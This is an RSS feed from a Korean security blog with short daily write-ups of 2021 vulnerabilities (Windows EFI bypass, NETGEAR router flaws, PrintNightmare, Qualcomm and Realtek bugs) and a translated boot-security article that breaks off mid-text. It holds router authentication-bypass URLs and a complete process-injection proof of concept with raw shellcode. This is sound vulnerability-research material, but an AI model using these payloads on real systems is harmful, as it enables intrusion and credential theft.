<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Sat, 03 Jul 2021 04:57:12 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2021-26892: AN AUTHORIZATION BYPASS ON THE MICROSOFT WINDOWS EFI SYSTEM PARTITION</title>
      <link>https://hackyboiz.github.io/2021/07/03/fabu1ous/2021-07-02/</link>
      <guid>https://hackyboiz.github.io/2021/07/03/fabu1ous/2021-07-02/</guid>
      <pubDate>Sat, 03 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/6/30/cve-2021</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/30/cve-2021-26892-an-authorization-bypass-on-the-microsoft-windows-efi-system-partition">AN AUTHORIZATION BYPASS ON THE MICROSOFT WINDOWS EFI SYSTEM PARTITION</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows Extensible Firmware Interface</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows Extensible Firmware Interface의 보안 기능을 우회하는 방법이 발견됐습니다. UEFI는 BIOS를 대체하는 펌웨어 규격으로 부팅 시 프로세서가 실행하는 첫 인스트럭션을 담고 있습니다. UEFI는 EFI System Partiton(이하 ESP)를 포함한 boot device를 탐색하는 작업을 합니다. ESP는 FAT 파일 시스템 포맷을 따르며 OS를 실행하기 위해 펌웨어가 파싱하는 <code>.EFI</code>파일(부트로더라고도 불림)을 담고 있습니다. FAT 파일 시스템은 ACL이나 보안 정책을 파일에 기록하지 않기 때문에 Windows에 마운트 되면 누구나 그 안에 있는 모든 파일에 읽기 또는 쓰기 작업을 할 수 있습니다. 부팅에 필요한 critical 파일을 누구나 접근할 수 있다면 악성코드를 담은 bootkit으로 대체되는 등의 문제가 발생할 수 있습니다. 따라서 Windows는 부팅이 완료된 이후에 ESP가 마운트 되는 것을 제한하고, 만약 마운트 됐다 하더라도 관리자 권한이 없다면 해당 볼륨에 어떠한 작업도 허용하지 않습니다.</p><p>하지만 <code>CreateFile</code> API와 ESP 볼륨 이름을 포함한 절대 경로를 통해 관리자 권한 없이 ESP 내부에 존재하는 임의의 <code>.EFI</code> 파일 핸들을 얻어 해당 파일의 내용을 백지화할 수 있습니다. 이미 존재하는 파일에 대해 <code>dwDesiredAccess</code> 값이 없고 <code>dwCreateDisposition</code> 에 <code>CREATE_ALWAYS</code>  플래그를 사용한 <code>CreateFile</code> 요청은 대상 파일의 크기를 0으로 축소합니다. 이를 악용해 관리자 권한이 없는 사용자라도 critical한 <code>.EFI</code> 파일의 내용을 지워버릴 수 있고 해당 시스템이 부팅하지 못하도록 만들 수 있습니다.</p><pre><code class="hljs c"><span class="hljs-function">HANDLE <span class="hljs-title">CreateFileA</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  LPCSTR                lpFileName,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwDesiredAccess,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwShareMode,</span></span><span class="hljs-function"><span class="hljs-params">  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwCreationDisposition,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwFlagsAndAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  HANDLE                hTemplateFile</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/auth-bypass/">auth bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/efi/">efi</category>
      
      <category domain="https://hackyboiz.github.io/tags/boot/">boot</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/03/fabu1ous/2021-07-02/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] NETGEAR firmware 취약점</title>
      <link>https://hackyboiz.github.io/2021/07/02/idioth/2021-07-02/</link>
      <guid>https://hackyboiz.github.io/2021/07/02/idioth/2021-07-02/</guid>
      <pubDate>Fri, 02 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.microsoft.com/security/blog/2021/06/30/micros</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.microsoft.com/security/blog/2021/06/30/microsoft-finds-new-netgear-firmware-vulnerabilities-that-could-lead-to-identity-theft-and-full-system-compromise/">Microsoft finds new NETGEAR firmware vulnerabilities that could lead to identity theft and full system compromise</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NETGEAR DGN-2200v1 시리즈</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>마이크로소프트에서 NETGEAR DGN-2200v1 시리즈 라우터에서 네트워크 보안을 손상시킬 수 있는 세 가지 취약점을 발견하였습니다.</p><p><strong>인증 우회를 통한 라우터 관리자 페이지 접근</strong></p><p>HTTPd 내부 처리 코드에서 <code>strstr</code>을 사용하여 전체 문자열에서 <code>.jpg</code>, <code>.gif</code>, <code>ess_</code> 등의 문자열이 마지막에 존재하는지 확인합니다. 따라서 GET 파라미터를 통해 인증이 필요한 페이지 뒤에 해당 필터링이 걸린 문자를 넣으면 인증을 우회하고 페이지에 접근이 가능합니다.</p><pre><code class="hljs asciidoc">예시) <span class="hljs-link">http://127</span>[<span class="hljs-string">.</span>]<span class="hljs-link">0[.]0</span>[<span class="hljs-string">.</span>]<span class="hljs-link">1/admin.htm?pic.gif</span></code></pre><p><strong>Cryptographic side-channel을 통해 저장된 라우터 자격 증명 가져오기</strong></p><p>라우터에서 HTTPd 페이지에 인증해야하는 경우 HTTP basic authentication이 필요합니다. 사용자 이름과 비밀번호는 base64로 인코딩되고 HTTP 헤더로 전송된 후 라우터의 메모리에 저장된 이름과 비밀번호와 비교해 확인합니다. 라우터는 파일 시스템 외부에 있는 NVRAM에 인증 정보를 저장하므로 이를 추출할 수 있습니다.</p><p>하지만 인증 부분에서 이름과 비밀번호를 <code>strcmp</code>를 사용하여 비교합니다. <code>strcmp</code>는 NUL을 만나거나 일치하지 않는 부분이 생길 때까지 문자열을 비교하므로 실패할 때까지 걸리는 시간을 통해 side-channel attack이 가능합니다.</p><p><strong>저장된 민감한 정보 탐색</strong></p><p>위에서 설명드린 인증 우회 취약점으로 인증이 필요한 페이지에 접근하는 것 뿐만 아니라 라우터의 설정 백업/복구 기능을 사용하여 사용자 이름, 비밀번호를 가져올 수 있습니다. <code>http://router_addr:8080/NETGEAR_DGN2200[.]cfg?pic[.]gif</code>로 접근하면 설정 파일을 얻을 수 있습니다. 해당 파일은 DES로 암호화 되어있으며, 백업/복구 기능의 코드에서 <code>NtgrBak</code> 키를 통해 암호화 됩니다. 이를 통해 해커는 NVRAM에 저장된 암호를 얻을 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/side-channel-attack/">side-channel attack</category>
      
      <category domain="https://hackyboiz.github.io/tags/authentication-bypass/">authentication bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/netgear/">netgear</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/02/idioth/2021-07-02/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-1675: Windows Spooler Service 원격 코드 실행 취약점</title>
      <link>https://hackyboiz.github.io/2021/07/01/l0ch/2021-07-01/</link>
      <guid>https://hackyboiz.github.io/2021/07/01/l0ch/2021-07-01/</guid>
      <pubDate>Thu, 01 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/afwu/PrintNightmare&quot;&gt;PrintNightmare (C</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/afwu/PrintNightmare">PrintNightmare (CVE-2021-1675): Remote code execution in Windows Spooler Service</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PrintNightmare라는 이름의 Printer Spooler 원격 코드 실행 취약점의 세부 정보 및 PoC가 공개되었습니다.</p><p>취약점은 프린터 서버에 드라이버를 추가하거나 업데이트하는 과정에서 발생합니다. <code>RpcAddPrinterDriver</code> 함수는 프린터 드라이버를 추가할 때 Spooler Service에 대한 검사를 수행합니다.</p><pre><code class="hljs c"><span class="hljs-number">1</span>:<span class="hljs-function">__int64 __fastcall <span class="hljs-title">SplAddPrinterDriverEx</span><span class="hljs-params">(.. <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a4 ..)</span></span>&#123;<span class="hljs-number">2</span>:...<span class="hljs-number">3</span>:<span class="hljs-number">4</span>:<span class="hljs-keyword">if</span>( !_bittest((<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> *)&amp;a4, <span class="hljs-number">0xF</span>u))<span class="hljs-number">5</span>:v11 = a7;<span class="hljs-number">6</span>:<span class="hljs-keyword">if</span>(v11 &amp;&amp; !(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)ValidateObjectAccess(<span class="hljs-number">0</span>i64, <span class="hljs-number">1</span>i64, <span class="hljs-number">0</span>i64)<span class="hljs-number">7</span>:<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<span class="hljs-number">8</span>:<span class="hljs-keyword">return</span> InternalAddPrinterDriverEx(lpString1, a2, a3, a4, (struct _INISPOOLER *)a5, a6, v11, <span class="hljs-number">0</span>i64);<span class="hljs-number">9</span>:<span class="hljs-number">10</span>:&#125;</code></pre><p>line 4와 5에서 <code>a4</code>는 유저 권한의 사용자가 제어할 수 있으며 해커는 이를 이용해 검사를 우회하고 악성 DLL을 타겟 서버에 설치할 수 있습니다. 또한 프린터 드라이버 정보 구조체의 <code>pConfigFile</code>이 UNC 경로가 허용된다는 점을 이용해 원격으로 타겟 서버에 로드할 수 있으며 드라이버 업그레이드의 백업 기능으로 액세스 충돌을 우회하고 로드된 악성 dll을 spooler service에 삽입할 수 있습니다.</p><blockquote><p>UNC(Universal Naming Convention) : 네트워크 상의 공유 파일 경로 포맷 ex) \servername\sharename\path\filename</p></blockquote><p>해당 취약점에 대해 Microsoft는 2021년 6월 8일 Patch Tuesday 릴리즈에서 패치했지만 패치가 취약점을 해결하지 못한 것으로 알려졌습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://twitter.com/cyb3rops/status/1410232292308664323?fbclid=IwAR29FyubigoMk4rEoNsoIg0hKmN-ecCWHuwADnf0kRQJkxcQlOBikWvJBG0">https://twitter.com/cyb3rops/status/1410232292308664323?fbclid=IwAR29FyubigoMk4rEoNsoIg0hKmN-ecCWHuwADnf0kRQJkxcQlOBikWvJBG0</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/printer-spooler/">printer spooler</category>
      
      <category domain="https://hackyboiz.github.io/tags/printnightmare/">printnightmare</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/01/l0ch/2021-07-01/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-1905: Qualcomm Adreno GPU memory mapping use-after-free</title>
      <link>https://hackyboiz.github.io/2021/06/30/fabu1ous/2021-06-30/</link>
      <guid>https://hackyboiz.github.io/2021/06/30/fabu1ous/2021-06-30/</guid>
      <pubDate>Wed, 30 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://googleprojectzero.github.io/0days-in-the-wild/0da</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-1905.html">CVE-2021-1905: Qualcomm Adreno GPU memory mapping use-after-free</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Qualcomm Adreno GPU</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Qualcomm Adreno GPU는 여러 프로세스의 메모리 매핑을 동싱에 처리하는 과정에서 Use-after-free 취약점이 발생합니다. GPU는 여러 VMA(Linux Virtual Memory Access)와 메모리 매핑을 공유하고 하나의 매핑이 닫히면 <code>kpsl_gpumem_vm_close</code> 함수를 호출해 <code>entry-&gt;memdesc.useraddr</code> 필드를 초기화합니다. 문제는 해당 필드가 여러 VMA에 공유되며 entry가 이미 매핑되었는지 확인하는 데 사용되므로 나머지 VMA에 의도하지 않은 버그가 발생합니다. Linux kernel mmap implementation에 따라 서로 다른 프로세스에서 동시에 호출이 불가능한 함수 <code>kpsl_get_unmapped_area</code>를 두 프로세스에서 같은 GPU 매핑에 대해 경쟁하도록 race condition을 발생시킬 수 있습니다. 따라서 구조체 <code>kpsl_mem_entry</code>가 서로 다른 두 프로세스에서 동시에 사용되어 use-after-free로 이어질 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/android/">android</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/race-condition/">race-condition</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/30/fabu1ous/2021-06-30/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-32537: Realtek 드라이버의 OOB Access 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/29/l0ch/2021-06-29/</link>
      <guid>https://hackyboiz.github.io/2021/06/29/l0ch/2021-06-29/</guid>
      <pubDate>Tue, 29 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/0vercl0k/CVE-2021-32537&quot;&gt;CVE-2021-3253</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0vercl0k/CVE-2021-32537">CVE-2021-32537: Out-of-bounds access in RTKVHD64 leading to pool corruption.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Surface Book/Pro</li><li>Lenovo Thinkpad</li><li>Dell XPS 13</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Realtek의 오디오 드라이버에서 OOB Access 취약점이 발견되어 세부 정보 및 PoC가 공개되었습니다.</p><p>취약점은 오디오 드라이버 <code>RTKVHD64.sys</code>에서 발생합니다. 해당 드라이버는 초기화 중 <code>PcAddAdapterDevice</code> 함수의 파라미터인 <code>StartDevice</code>에 의해 호출된 <code>InitDeviceExtension</code> 함수에서 커널 풀에 <code>MEVT</code> 구조체를 할당합니다.</p><pre><code class="hljs c">devext-&gt;unk-&gt;events = ExAllocatePoolWithTag(pooltype, 0x5F0ui64, &#x27;mEvt&#x27;);<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EVT</span> &#123;</span>    PKSPIN_LOCK lock;    PVOID       event;    UINT64      someflag;&#125; <span class="hljs-comment">/* sizeof == 0x18 */</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MEVT</span> &#123;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EVT</span> <span class="hljs-title">array</span>[63];</span>    UINT64 flags;&#125; <span class="hljs-comment">/* sizeof == 0x18*63 + 8 == 0x5f0 */</span></code></pre><p><code>MEVT</code>의 <code>EVT</code> 구조체는 63개의 고정된 크기의 배열입니다.</p><pre><code class="hljs c">input_index = *(_DWORD *)IrpSystemBuffer;v5 = Crash(mevts, <span class="hljs-built_in">stack</span>-&gt;FileObject, unk, &amp;mevts-&gt;<span class="hljs-built_in">array</span>[input_index].event,        (KSPIN_LOCK *)&amp;mevts-&gt;<span class="hljs-built_in">array</span>[input_index]);</code></pre><p>드라이버에 <code>0x225f04</code> IOCTL 코드를 전송하면 유저버퍼인 <code>IrpSystemBuffer</code>의 첫 번째 DWORD 데이터가 <code>input_index</code>에 저장됩니다. <code>input_index</code>는 위 <code>Crash</code> 함수에서 <code>(KSPIN_LOCK *)&amp;mevts-&gt;array[input_index]</code>와 같이 <code>MEVT</code>의 <code>EVT</code> 배열에 접근할 때 인덱스로 사용됩니다. 따라서 해커는 IOCTL 입력 버퍼를 통해 <code>input_index</code>를 임의의 값으로 설정할 수 있어 Out Of Bound Access로 이어집니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/oob/">oob</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/driver/">driver</category>
      
      <category domain="https://hackyboiz.github.io/tags/realtek/">realtek</category>
      
      <category domain="https://hackyboiz.github.io/tags/out-of-bound/">out-of-bound</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/29/l0ch/2021-06-29/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Process Injection without Write/Execute Permission</title>
      <link>https://hackyboiz.github.io/2021/06/28/idioth/2021-06-28/</link>
      <guid>https://hackyboiz.github.io/2021/06/28/idioth/2021-06-28/</guid>
      <pubDate>Mon, 28 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://xret2pwn.github.io//process-inection/&quot;&gt;Process In</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://xret2pwn.github.io//process-inection/">Process Injection without Write/Execute Permission</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 블로그에서 non-writable allocation에 shellcode를 작성하고 non-executable allocation에서 이를 실행하는 방법이 공개되었습니다.</p><p>먼저 non-writable allocation에 <code>VirtualAlloc</code>을 통해 <code>PAGE_EXECUTE_READ</code> 권한을 부여하여 shellcode를 작성합니다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READ);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Allocation created successfully %p \n&quot;</span>, exec);<span class="hljs-keyword">if</span> (WriteProcessMemory(GetCurrentProcess(), exec, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>)) &#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Shellcode wrote successfully.&quot;</span>);&#125;<span class="hljs-keyword">else</span> &#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] No permission to write the shellcode.&quot;</span>);&#125;</code></pre><p><img src="https://xret2pwn.github.io/assets/img/posts/Process_Injection/cpp_write_the_shellcode_executed.png" alt="screenshot_4"></p><p>성공적으로 shellcode가 작성됨을 확인할 수 있습니다. 그 후 해당 영역 (non-executable allocation)에 <code>PAGE_READONLY</code> 권한을 부여합니다. 하지만 DEP (Data Execution Prevention) 보호 기법으로 인해 메모리에서 직접 shellcode를 실행할 수 없습니다. 따라서 DEP가 걸려있지 않은 프로세스를 찾아 해당 프로세스에 shellcode를 injection 하면 읽기/쓰기 권한 없이 shellcode를 실행할 수 있습니다.</p><p>POC는 다음과 같습니다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] =        <span class="hljs-string">&quot;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b&quot;</span>        <span class="hljs-string">&quot;\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b&quot;</span>        <span class="hljs-string">&quot;\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24&quot;</span>        <span class="hljs-string">&quot;\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a&quot;</span>        <span class="hljs-string">&quot;\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0&quot;</span>        <span class="hljs-string">&quot;\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c&quot;</span>        <span class="hljs-string">&quot;\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a&quot;</span>        <span class="hljs-string">&quot;\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2&quot;</span>        <span class="hljs-string">&quot;\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f&quot;</span>        <span class="hljs-string">&quot;\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52&quot;</span>        <span class="hljs-string">&quot;\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33&quot;</span>        <span class="hljs-string">&quot;\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89&quot;</span>        <span class="hljs-string">&quot;\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c&quot;</span>        <span class="hljs-string">&quot;\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67&quot;</span>        <span class="hljs-string">&quot;\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3&quot;</span>        <span class="hljs-string">&quot;\x68\x70\x77\x6e\x58\x68\x52\x65\x74\x32\x31\xc9\x88\x4c\x24&quot;</span>        <span class="hljs-string">&quot;\x07\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff&quot;</span>        <span class="hljs-string">&quot;\x55\x08&quot;</span>;    HANDLE processHandle;    HANDLE remoteThread;    PVOID remoteBuffer;    DWORD oldPerms;    DWORD PID = <span class="hljs-number">17968</span>;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Injecting to PID: %i&quot;</span>, PID);    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);    remoteBuffer = VirtualAllocEx(processHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span> shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);    WriteProcessMemory(processHandle, remoteBuffer, shellcode, <span class="hljs-keyword">sizeof</span> shellcode, <span class="hljs-literal">NULL</span>);    VirtualProtectEx(processHandle, (LPVOID)<span class="hljs-keyword">sizeof</span>(processHandle), <span class="hljs-keyword">sizeof</span>(shellcode), PAGE_READONLY, &amp;oldPerms);    remoteThread = CreateRemoteThread(processHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);    CloseHandle(processHandle);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/process-injection/">process injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/cpp/">cpp</category>
      
      <category domain="https://hackyboiz.github.io/tags/shellcode/">shellcode</category>
      
      <category domain="https://hackyboiz.github.io/tags/redteam/">redteam</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/28/idioth/2021-06-28/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Translation] Measured Boot와 멀웨어 시그니처: Windows Loader에서 발견된 두 가지 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/27/l0ch/measured-boot-vuln/</link>
      <guid>https://hackyboiz.github.io/2021/06/27/l0ch/measured-boot-vuln/</guid>
      <pubDate>Sun, 27 Jun 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;안녕하세요 L0ch입니다!&lt;/p&gt;
&lt;p&gt;오늘은 Windows Kernel 및 Loader에서 발견된 취약점 두 개를 들고 왔는데요, 원래는 하루한줄로 간단하게 정리하려다 접할 기회가 많이 없는 Boot Security에 대한 설명 등 취약점의 이</description>
        
      
      
      
      <content:encoded><![CDATA[<p>안녕하세요 L0ch입니다!</p><p>오늘은 Windows Kernel 및 Loader에서 발견된 취약점 두 개를 들고 왔는데요, 원래는 하루한줄로 간단하게 정리하려다 접할 기회가 많이 없는 Boot Security에 대한 설명 등 취약점의 이해를 돕기 위한 내용이 잘 정리되어 있더라구요. 개인적으로 재밌게 읽어서 정리도 할 겸 번역글로 남겨봤습니다!</p><p>오역과 의역덩어리 번역글이니 지적은 매우 환영이에요..!</p><blockquote><p>원문 : <a href="https://bi-zone.medium.com/measured-boot-and-malware-signatures-exploring-two-vulnerabilities-found-in-the-windows-loader-5a4fcc3c4b66">Measured Boot and Malware Signatures: exploring two vulnerabilities found in the Windows loader</a></p></blockquote><hr><h1 id="Introduction-to-Boot-Security"><a href="#Introduction-to-Boot-Security" class="headerlink" title="Introduction to Boot Security"></a>Introduction to Boot Security</h1><p>Boot Security에는 Verified Boot와 Measured Boot라는 두 가지 주요 개념이 있다.</p><h2 id="Verified-Boot"><a href="#Verified-Boot" class="headerlink" title="Verified Boot"></a>Verified Boot</h2><p>Verified Boot 프로세스는 신뢰할 수 있는 디지털 서명이 되지 않은 구성 요소가 부팅 중에 실행되지 않도록 한다. 이 프로세스는 서명되지 않았거나 제대로 서명되지 않은 부팅 구성 요소 (예 : 부팅 관리자 및 펌웨어 드라이버)가 시스템에서 실행되는 것을 차단하는 기능인 Secure Boot로 구현된다.</p><h2 